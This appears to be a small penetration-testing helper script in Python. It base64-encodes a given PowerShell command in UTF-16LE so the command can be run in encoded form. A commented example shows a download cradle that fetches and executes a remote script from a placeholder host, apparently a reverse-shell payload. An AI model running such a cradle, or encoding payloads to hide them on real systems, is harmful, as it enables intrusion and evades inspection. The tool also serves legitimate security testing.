#!/usr/bin/python3

import base64
import argparse


def main():
    args = parse_arguments()
    cmd = args.cmd
    # cmd = "iex((New-Object System.Net.WebClient).DownloadString('http://x/pl/rev.txt'))"
    encoded_command = encode_powershell_command(cmd)
    print(encoded_command)


def parse_arguments():
    parser = argparse.ArgumentParser(
        description="Generate base64 encoded PowerShell commands"
    )
    parser.add_argument("--cmd", "-c", required=True, help="command")
    args = parser.parse_args()

    return args


def encode_powershell_command(command):
    command_bytes = command.encode("utf-16le")
    encoded_command = base64.b64encode(command_bytes)
    encoded_command_str = encoded_command.decode("utf-8")

    return encoded_command_str


if __name__ == "__main__":
    main()
